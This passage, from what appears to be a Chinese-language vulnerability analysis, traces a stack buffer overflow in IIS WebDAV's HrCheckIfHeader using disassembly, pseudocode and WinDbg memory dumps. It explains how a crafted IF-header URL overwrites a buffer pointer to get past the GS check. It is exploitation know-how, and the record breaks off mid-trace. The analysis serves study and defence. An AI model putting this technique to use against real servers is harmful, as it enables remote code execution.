class="brush:plain;toolbar:false">.text:67127017&nbsp;loc_67127017:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;ScStoragePathFromUrl(IEcb&nbsp;const&nbsp;&amp;,ushort&nbsp;const&nbsp;*,ushort&nbsp;*,uint&nbsp;*,CVRoot&nbsp;*&nbsp;*)+50j
.text:67127017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ScStoragePathFromUrl(IEcb&nbsp;const&nbsp;&amp;,ushort&nbsp;const&nbsp;*,ushort&nbsp;*,uint&nbsp;*,CVRoot&nbsp;*&nbsp;*)+67j
.text:67127017&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,&nbsp;[ebp+var_C]
.text:6712701A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi
.text:6712701B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;large&nbsp;fs:0,&nbsp;ecx
.text:67127022&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,&nbsp;[ebp+var_10]
.text:67127025&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi
.text:67127026&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;@__security_check_cookie@4&nbsp;;&nbsp;__security_check_cookie(x)
.text:6712702B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;leave
.text:6712702C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retn&nbsp;&nbsp;&nbsp;&nbsp;0Ch</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">漏洞利用非常精妙，也就是用这种方法，巧妙的绕过了gs的检查，最后达到漏洞利用，稳定的代码执行，首先，WebDav对数据包的处理逻辑是在DAVxxx函数中完成的。比如当前数据包是PROPFIND，那么当前的函数处理逻辑就是DAVpropfind函数。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;kb
ChildEBP&nbsp;RetAddr&nbsp;&nbsp;Args&nbsp;to&nbsp;Child&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
00fff798&nbsp;67119469&nbsp;680312c0&nbsp;00fff800&nbsp;00000000&nbsp;httpext!ScStoragePathFromUrl
00fff7ac&nbsp;6712544a&nbsp;0060e7b0&nbsp;680312c0&nbsp;00fff800&nbsp;httpext!CMethUtil::ScStoragePathFromUrl+0x18
00fffc34&nbsp;6712561e&nbsp;0060b508&nbsp;0060584e&nbsp;00fffc78&nbsp;httpext!HrCheckIfHeader+0x124
00fffc44&nbsp;6711f659&nbsp;0060b508&nbsp;0060584e&nbsp;00000001&nbsp;httpext!HrCheckStateHeaders+0x10
00fffc78&nbsp;6711f7c5&nbsp;0060c010&nbsp;00fffcd4&nbsp;671404e2&nbsp;httpext!CPropFindRequest::Execute+0xf0
00fffc90&nbsp;671296f2&nbsp;0060c010&nbsp;00000004&nbsp;01017af8&nbsp;httpext!DAVPropFind+0x47</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在内层的函数处理逻辑中，有一处关键的函数处理逻辑HrCheckIfHeader，主要负责DAVPropFind函数对头部的check，这个函数处理逻辑中有一处while循环，我已经把这个循环的关键位置的注释写在伪代码中。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">__int32&nbsp;__stdcall&nbsp;HrCheckIfHeader(struct&nbsp;CMethUtil&nbsp;*a1,&nbsp;const&nbsp;unsigned&nbsp;__int16&nbsp;*a2)
&nbsp;while&nbsp;(&nbsp;2&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;v6&nbsp;=&nbsp;IFITER::PszNextToken(&amp;v20,&nbsp;0);
&nbsp;&nbsp;&nbsp;&nbsp;v7&nbsp;=&nbsp;v6;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v6&nbsp;)／／这里获取下一个url值，第一轮会进入这里，第二轮也会，第三轮就进不去了
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CStackBuffer&lt;unsigned&nbsp;short,260&gt;::CStackBuffer&lt;unsigned&nbsp;short,260&gt;(260);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v9&nbsp;=&nbsp;(const&nbsp;wchar_t&nbsp;*)(v7&nbsp;+&nbsp;2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOBYTE(v34)&nbsp;=&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v27&nbsp;=&nbsp;_wcslen(v9);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!CStackBuffer&lt;unsigned&nbsp;short,260&gt;::resize(2&nbsp;*&nbsp;v27&nbsp;+&nbsp;2)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_35;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v5&nbsp;=&nbsp;ScCanonicalizePrefixedURL(v9,&nbsp;v32,&nbsp;&amp;v27);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v5&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_43;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v27&nbsp;=&nbsp;v29&nbsp;&gt;&gt;&nbsp;3;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v5&nbsp;=&nbsp;CMethUtil::ScStoragePathFromUrl(a1,&nbsp;v32,&nbsp;Str,&nbsp;&amp;v27);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v5&nbsp;==&nbsp;1&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!CStackBuffer&lt;unsigned&nbsp;short,260&gt;::resize(v27)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
LABEL_35:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOBYTE(v34)&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CStackBuffer&lt;char,260&gt;::release(&amp;v31);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v5&nbsp;=&nbsp;-2147024882;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v5&nbsp;=&nbsp;CMethUtil::ScStoragePathFromUrl(a1,&nbsp;v32,&nbsp;Str,&nbsp;&amp;v27);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v5&nbsp;&lt;&nbsp;0&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
LABEL_43:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOBYTE(v34)&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CStackBuffer&lt;char,260&gt;::release(&amp;v31);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v10&nbsp;=&nbsp;_wcslen(Str);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v27&nbsp;=&nbsp;v10;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v11&nbsp;=&nbsp;&amp;Str[v10&nbsp;-&nbsp;1];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*v11&nbsp;==&nbsp;62&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*v11&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v8&nbsp;=&nbsp;Str;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOBYTE(v34)&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CStackBuffer&lt;char,260&gt;::release(&amp;v31);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v25&nbsp;)／／进不去就跳入这里，直接break掉，随后进入locktoken，会调用sc函数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_38;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v8&nbsp;=&nbsp;(const&nbsp;unsigned&nbsp;__int16&nbsp;*)v24;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;v25&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(&nbsp;i&nbsp;=&nbsp;(wchar_t&nbsp;*)IFITER::PszNextToken(&amp;v20,&nbsp;2);&nbsp;;&nbsp;i&nbsp;=&nbsp;(wchar_t&nbsp;*)IFITER::PszNextToken(&amp;v20,&nbsp;v19)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v17&nbsp;=&nbsp;i;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!i&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v12&nbsp;=&nbsp;*i;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*v17&nbsp;==&nbsp;60&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;HrValidTokenExpression((int)a1,&nbsp;v17,&nbsp;(int)v8,&nbsp;0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(&nbsp;v12&nbsp;==&nbsp;91&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!FGetLastModTime(0,&nbsp;v8,&nbsp;(struct&nbsp;_FILETIME&nbsp;*)&amp;v23)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;!FETagFromFiletime((int)&amp;v23,&nbsp;&amp;String,&nbsp;*((_DWORD&nbsp;*)a1&nbsp;+&nbsp;4))&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
LABEL_26:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v22&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_27;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_30;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v14&nbsp;=&nbsp;v17&nbsp;+&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*v14&nbsp;==&nbsp;87&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v14&nbsp;+=&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v15&nbsp;=&nbsp;_wcslen(&amp;String);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;_wcsncmp(&amp;String,&nbsp;v14,&nbsp;v15);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;-2147467259;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v13&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_26;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v22&nbsp;)／／如果不等于22，则v26为1&nbsp;continue，这里v22为0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
LABEL_27:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v26&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v19&nbsp;=&nbsp;3;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
LABEL_30:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v26&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v19&nbsp;=&nbsp;4;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;v2&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v26&nbsp;)／／这里进这里
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v6&nbsp;=&nbsp;IFITER::PszNextToken(&amp;v20,&nbsp;1);／／获得下一个url部分，第一次处理完，由于后面还有url，所以这里v6会有值，而第二次，这里后面没有值了
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果看的比较迷糊，可以看我下面的描述，首先这个while函数中，有一个非常有意思的函数PszNextToken，这个函数会连续获取&lt;&gt;中的http url，直到后面没有http url，则跳出循环，这也是这个漏洞利用的关键条件。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，第一次会处理IF后面的第一个http url，这个url就是http://localhost/aaaa..，这个处理过程，实际上就完成了第一次溢出，首先stackbuffer会通过CStackBuffer函数获取，获取到之后，这个值会存放在stack中的一个位置。接下来会进行第一次ScStorageFromUrl，这个地方会对第一个&lt;&gt;中的http url处理。长度是0xa7。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=00fff910&nbsp;ebx=0060b508&nbsp;ecx=00000410&nbsp;edx=00000000&nbsp;esi=0060c64a&nbsp;edi=77bd8ef2
eip=671253e2&nbsp;esp=00fff7bc&nbsp;ebp=00fffc34&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!HrCheckIfHeader+0xbc:
671253e2&nbsp;ffd7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;edi&nbsp;{msvcrt!wcslen&nbsp;(77bd8ef2)}／／第一次处理aaaa部分，长度只有a7
0:009&gt;&nbsp;dc&nbsp;60c64a
0060c64a&nbsp;&nbsp;00740068&nbsp;00700074&nbsp;002f003a&nbsp;006c002f&nbsp;&nbsp;h.t.t.p.:././.l.
0060c65a&nbsp;&nbsp;0063006f&nbsp;006c0061&nbsp;006f0068&nbsp;00740073&nbsp;&nbsp;o.c.a.l.h.o.s.t.
0060c66a&nbsp;&nbsp;0061002f&nbsp;00610061&nbsp;00610061&nbsp;00610061&nbsp;&nbsp;/.a.a.a.a.a.a.a.
0060c67a&nbsp;&nbsp;78636f68&nbsp;71337761&nbsp;47726936&nbsp;4b777a39&nbsp;&nbsp;hocxaw3q6irG9zwK
0:009&gt;&nbsp;p
eax=000000a7</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这个a7长度很小，不会覆盖到gs，因此可以通过security check，但是这个a7却是一个溢出，它超过了stack buffer的长度，会覆盖到stack中关于stack buffer指针的存放位置。这个位置保存在ebp-328的位置。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=00fff800&nbsp;ebx=0060b508&nbsp;ecx=0060b508&nbsp;edx=00000104&nbsp;esi=00000001&nbsp;edi=77bd8ef2
eip=67125479&nbsp;esp=00fff7b8&nbsp;ebp=00fffc34&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!HrCheckIfHeader+0x153:
67125479&nbsp;ffb5e4fdffff&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-21Ch]&nbsp;ss:0023:00fffa18=0060c828
0:009&gt;&nbsp;p
eax=00fff800&nbsp;ebx=0060b508&nbsp;ecx=0060b508&nbsp;edx=00000104&nbsp;esi=00000001&nbsp;edi=77bd8ef2
eip=6712547f&nbsp;esp=00fff7b4&nbsp;ebp=00fffc34&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!HrCheckIfHeader+0x159:
6712547f&nbsp;e8cd3fffff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;httpext!CMethUtil::ScStoragePathFromUrl&nbsp;(67119451)
0:009&gt;&nbsp;dd&nbsp;ebp-328／／注意拷贝的地址，这个90c是scstoragepathfromurl要拷贝的栈地址
00fff90c&nbsp;&nbsp;00fff804&nbsp;6711205b&nbsp;00000013&nbsp;00fff9c0
00fff91c&nbsp;&nbsp;671287e7&nbsp;00000000&nbsp;000000f0&nbsp;00000013</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，第一次ScStoragePathFromUrl的时候，拷贝的地址是一个栈地址，通过stackbuffer申请到的，但是由于memcpy引发的栈溢出，导致这个地方值会被覆盖。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;g//执行结束ScStoragePathFromUrl函数执行返回后
Breakpoint&nbsp;0&nbsp;hit
eax=00fff800&nbsp;ebx=0060b508&nbsp;ecx=00605740&nbsp;edx=0060c828&nbsp;esi=00000001&nbsp;edi=77bd8ef2
eip=67126c7b&nbsp;esp=00fff79c&nbsp;ebp=00fff7ac&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!ScStoragePathFromUrl:
67126c7b&nbsp;b8150d1467&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,offset&nbsp;httpext!swscanf+0x14b5&nbsp;(67140d15)
0:009&gt;&nbsp;g
Breakpoint&nbsp;3&nbsp;hit
eax=00000000&nbsp;ebx=0060b508&nbsp;ecx=00002f06&nbsp;edx=00fff804&nbsp;esi=00000001&nbsp;edi=77bd8ef2
eip=67125484&nbsp;esp=00fff7c0&nbsp;ebp=00fffc34&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
httpext!HrCheckIfHeader+0x15e:
67125484&nbsp;8bf0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,eax
0:009&gt;&nbsp;dc&nbsp;fff804／／第一次memcpy之后，覆盖到了90c的位置
00fff804&nbsp;&nbsp;003a0063&nbsp;0069005c&nbsp;0065006e&nbsp;00700074&nbsp;&nbsp;c.:.\.i.n.e.t.p.
00fff814&nbsp;&nbsp;00620075&nbsp;0077005c&nbsp;00770077&nbsp;006f0072&nbsp;&nbsp;u.b.\.w.w.w.r.o.
00fff824&nbsp;&nbsp;0074006f&nbsp;0061005c&nbsp;00610061&nbsp;00610061&nbsp;&nbsp;o.t.\.a.a.a.a.a.
00fff834&nbsp;&nbsp;00610061&nbsp;78636f68&nbsp;71337761&nbsp;47726936&nbsp;&nbsp;a.a.hocxaw3q6irG
00fff844&nbsp;&nbsp;4b777a39&nbsp;75534f70&nbsp;48687a4f&nbsp;6d545663&nbsp;&nbsp;9zwKpOSuOzhHcVTm
00fff854&nbsp;&nbsp;39536845&nbsp;5567506c&nbsp;33646763&nbsp;78454630&nbsp;&nbsp;EhS9lPgUcgd30FEx
00fff864&nbsp;&nbsp;54316952&nbsp;6a514c58&nbsp;42317241&nbsp;58507035&nbsp;&nbsp;Ri1TXLQjAr1B5pPX
00fff874&nbsp;&nbsp;6c473664&nbsp;546a3539&nbsp;54435034&nbsp;50617752&nbsp;&nbsp;d6Gl95jT4PCTRwaP
0:009&gt;&nbsp;dd&nbsp;fff900
00fff900&nbsp;&nbsp;5a306272&nbsp;54485938&nbsp;02020202&nbsp;680312c0</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">经过这次stack buffer overflow，这个值已经被覆盖，覆盖成了一个堆地址0x680312c0。接下来进入第二次调用。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=00fff910&nbsp;ebx=0060b508&nbsp;ecx=00000410&nbsp;edx=00000000&nbsp;esi=0060d32a&nbsp;edi=77bd8ef2
eip=671253e2&nbsp;esp=00fff7bc&nbsp;ebp=00fffc34&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
